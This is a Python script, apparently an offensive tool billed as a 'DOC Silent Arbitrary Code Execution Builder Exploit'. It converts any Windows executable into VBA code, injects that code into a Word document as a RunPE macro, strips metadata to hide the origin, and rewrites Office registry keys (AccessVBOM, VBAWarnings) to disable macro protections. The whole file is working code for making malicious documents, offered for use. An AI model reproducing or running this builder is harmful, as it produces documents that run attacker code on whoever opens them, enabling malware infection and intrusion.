__author__= 'mtgsoftworks'

import os, sys
from winreg import *
import itertools
from contextlib import contextmanager
from win32api import GetFileVersionInfo, LOWORD, HIWORD
from os import path
import platform
import signal
from subprocess import Popen, PIPE 
from os import system, remove
import argparse
import os.path

if platform.system().lower() == "windows":
    os.system('color')
    import win32com.client
    import winreg
else:
    print("\033[91m[+] Only for Windows :(")
    sys.exit()

@contextmanager
def suppress(*exceptions):
    try:
        yield
    except exceptions:
        pass

# Docm to doc or doc to docm file converting
allSupportedMSProgram = ['Excel', 'PowerPoint', 'Word']
allSupportedMSProgramExe = ['excel.exe','powerpnt.exe','winword.exe']

defaultIterNumberIfExists = 10000

def _createRegKeys():
    def subkeys(path, hkey=HKEY_LOCAL_MACHINE, flags=0):
       
        with suppress(WindowsError), OpenKey(hkey, path, 0, KEY_READ|flags) as k:
            for i in itertools.count():
                yield EnumKey(k, i)

    def get_version_number(filename):
        try:
            info = GetFileVersionInfo (filename, "\\")
            ms = info['FileVersionMS']
            ls = info['FileVersionLS']
            return HIWORD (ms), LOWORD (ms), HIWORD (ls), LOWORD (ls)
        except:
            return 0,0,0,0

    defaultPath = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths'
    subKeys = subkeys(defaultPath)
    for key in subKeys:
        if key.lower() in allSupportedMSProgramExe:
            subKey = OpenKey(HKEY_LOCAL_MACHINE, defaultPath + '\\' + key, 0, KEY_READ)
            filePath = QueryValueEx(subKey, 'Path')
            version = get_version_number(filePath[0] + '\\' + key)
            version = str(version[0]) + '.' + str(version[1])
            writePath = "Software\\Microsoft\\Office\\" + version
            officeProductName = allSupportedMSProgram[allSupportedMSProgramExe.index(key.lower())]
            writeKey = OpenKey(HKEY_CURRENT_USER, writePath + '\\' + officeProductName + '\\Security', 0, KEY_ALL_ACCESS)
            SetValueEx(writeKey, "AccessVBOM", 0, REG_DWORD, 1)
            SetValueEx(writeKey, "VBAWarnings", 0, REG_DWORD, 1)


def _multiFilesExportFolder(oldExportFolder, preTreatedExportFolder, exportFileName):
    exportFolder = oldExportFolder

    if os.path.isdir(oldExportFolder):
        for i in range(1,defaultIterNumberIfExists):
            newExportFolder = preTreatedExportFolder + '\\HtmlFiles_' + str(i) + '_' + exportFileName
            if not os.path.isdir(newExportFolder):
                exportFolder = newExportFolder
                break

    return exportFolder

class WordDocument:
    def __init__(self, documentPath):
        documentPath = os.path.abspath(documentPath)
        if not os.path.isfile(documentPath):
            raise Exception('The specified file path does not exist.')
        _createRegKeys()
        self.documentPath = documentPath
        splittedPath = documentPath.split('\\')
        self.fileName = '.'.join(splittedPath[-1].split('.')[:-1])
        self.defaultExportPath = '\\'.join(splittedPath[:-1])

    def _export(self, exportFilePath, enumNum):
        word = win32com.client.Dispatch("Word.Application")
        word.Visible = False
        document = word.Documents.Open(self.documentPath)
        document.SaveAs(exportFilePath, enumNum)
        word.Documents(1).Close(SaveChanges=False)
        word.Application.Quit()
        del word

    def _validateArgs(self, exportFolder, exportFileName):  
        if exportFolder is None:
            exportFolder = self.defaultExportPath
        elif not os.path.isdir(exportFolder):
            raise Exception('The specified output directory does not exist.')

        exportFolder = os.path.abspath(exportFolder)

        if exportFileName is None:
            exportFileName = self.fileName

        fileExtension = '.' + sys._getframe(1).f_code.co_name[2:].split('_')[0].lower()

        if not exportFileName.endswith(fileExtension):
            exportFileName = exportFileName + fileExtension

        elif len(os.path.normpath(exportFolder + '\\' + exportFileName)) != len(exportFolder + '\\' + exportFileName):
            raise Exception('The specified file name or the specified export folder contain invalid characters.')
        return exportFolder, exportFileName

    def toDocm(self, exportFolder=None, exportFileName=None):
        exportFolder, exportFileName = self._validateArgs(exportFolder,exportFileName)
        finalExportPath = exportFolder + '\\' + exportFileName
        self._export(finalExportPath,13)

    def toDoc(self, exportFolder=None, exportFileName=None):
        exportFolder, exportFileName = self._validateArgs(exportFolder,exportFileName)
        finalExportPath = exportFolder + '\\' + exportFileName
        self._export(finalExportPath,0)


def enableVbomWord():
   
    objWord = win32com.client.Dispatch("Word.Application")
    objWord.Visible = False  
    version = objWord.Application.Version
   
    objWord.Application.Quit()
    del objWord
    
    keyval = "Software\\Microsoft\Office\\" + version + "\\Word\\Security"
    print("\033[1;77m[+] Set %s to 1...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 1)  
    winreg.CloseKey(Registrykey)


def disableVbomWord():
   
    objWord = win32com.client.Dispatch("Word.Application")
    objWord.Visible = False  
    version = objWord.Application.Version
    keyval = "Software\\Microsoft\Office\\" + version + "\\Word\\Security"
    print("\033[1;77m[+] Set %s to 0...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 0)  
    winreg.CloseKey(Registrykey)


def wordMacro(filepath,macro_path):
    enableVbomWord()

    _file = os.path.abspath(sys.argv[0])
    path = os.path.dirname(_file)

    pathToWordFile = path + '\\' + filepath
    pathToMacro = path + '\\' + macro_path

    
    with open(pathToMacro, "r") as myfile:
        print('\033[1;77m[+] Reading macro into string from: \033[0m' + str(myfile))
        macro = myfile.read()

    print("Please waiting...")     

    Word = win32com.client.Dispatch("Word.Application")

    Word.Visible = False

    document = Word.Documents.Open(pathToWordFile)
    wordModule = document.VBProject.VBComponents("ThisDocument")
    wordModule.CodeModule.AddFromString(macro)

    print("\033[1;77m[+] Remove hidden data and personal info...\033[0m")
    wdRDIAll = 99
    document.RemoveDocumentInformation(wdRDIAll)
    document.Save()
    document.Close()
    Word.Application.Quit()

    del Word
    disableVbomWord()
    
    print("\033[1;77m[+] File is finalizing...\033[0m")

    document_final = WordDocument('data\OutputWord.docm')
    document_final.toDoc('data','Final.doc')

    print("\033[1;77m[+] Process successfully completed \033[0m")

# PE to VBA Converting
MAX_PROC_SIZE = 50 
MAX_LINE_SIZE = 50 
TAG_PE2VBA_BEGIN = "' ===== BEGIN PE2VBA ====="
TAG_PE2VBA_END = "' ===== END PE2VBA ====="

def is_printable(c):
 
  if c >= 0x20 and c < 0x7F and c != 0x22:
    return True
  else:
    return False

def pe_to_vba(pe):
  block = "" 
  line = ""
  ba = bytearray(pe)
  
  blocks = []
  cnt_bytes_current_line = 0
  cnt_lines_current_block = 0
  cnt_bytes_total = 0 
  prev_char_was_printable = False
  
  for b in ba:
  
    if cnt_lines_current_block == 0:
      
      block = "    strPE = \"\"\n"   
      cnt_lines_current_block += 1 
    if cnt_bytes_current_line == 0:
      
      line = "strPE"
    
    if is_printable(b):
      if prev_char_was_printable:
        line += chr(b)
      else:
        line = "B(%s, \"%s" % (line, chr(b))
      prev_char_was_printable = True
    else:
      if prev_char_was_printable:
        line += "\")"
      line = "A(%s, %s)" % (line, str(b))
      prev_char_was_printable = False
    
    cnt_bytes_current_line += 1 
    cnt_bytes_total += 1 

   
    if cnt_bytes_current_line == MAX_LINE_SIZE or cnt_bytes_total == len(ba):
      if prev_char_was_printable:
        block += "    strPE = %s\")\n" % (line)
      else:
        block += "    strPE = %s\n" % (line)
      prev_char_was_printable = False 
      cnt_bytes_current_line = 0
      cnt_lines_current_block += 1

   
    if cnt_lines_current_block == MAX_PROC_SIZE or cnt_bytes_total == len(ba):
      cnt_lines_current_block = 0 
      cnt_bytes_current_line = 0 
      blocks.append(block) 
  
 
  proc = ""
  for i in range(len(blocks)):
    proc += "Private Function PE" + str(i) + "() As String\n"
    proc += "   Dim strPE As String\n\n"
    proc += blocks[i]
    proc += "\n    PE" + str(i) + " = strPE\n"
    proc += "End Function\n\n"
  
  vba = ""
  vba += proc
  vba += "Private Function PE() As String\n"
  vba += "    Dim strPE As String\n"
  vba += "    strPE = \"\"\n"
  for i in range(len(blocks)):
    vba += "    strPE = strPE + PE" + str(i) + "()\n"
  vba += "    PE = strPE\n" 
  vba += "End Function\n" 
  
  return vba 

def apply_template(pe_as_vba):
  res = ""
  
  tmpl_dir = os.path.dirname(os.path.realpath(__file__))
  tmpl_filepath = os.path.join(tmpl_dir, "RunPE.vba") 
  
  if os.path.isfile(tmpl_filepath):
  
    tmpl_file = open(tmpl_filepath , "r") 
    concat_line = True
    
    for line in tmpl_file:
      cur_line = line.rstrip()
      
      if cur_line == TAG_PE2VBA_END:
        concat_line = True 
        
      if concat_line:
        res += line 
      
      if cur_line == TAG_PE2VBA_BEGIN:  
        concat_line = False 
        res += pe_as_vba 
    
    tmpl_file.close() 
      
  else:
    print("[!] Cannot find file: '%s'" % tmpl_filepath) 
  
  return res
  

def main():

  print("DOC Silent Arbitrary Code Execution Builder Exploit")
  print("--------- Author: viper_8080 - 0day.today ---------\n")
  
  pefile = input("\033[1;77mInput filename (.exe): \033[0m")

  pe_file = open(pefile, "rb") 
  pe = pe_file.read() 
  pe_file.close() 
  
  pe_as_vba = pe_to_vba(pe) 
    
  out_file_content = apply_template(pe_as_vba)
  
  out_filename = "%s.vba" % (pefile)
  out_file = open(out_filename , "w") 
  out_file.write(out_file_content) 
  out_file.close()

  if os.path.isfile(out_filename): 
    print("[+] Created file '%s'." % (out_filename))

  wordfile = input("\033[1;77mInput Filename (.doc): \033[0m")
  document = WordDocument(wordfile)
  document.toDocm('data','OutputWord.docm')
  wordMacro("data\OutputWord.docm",out_filename)
  
  return 

if __name__ == '__main__':
  main() 









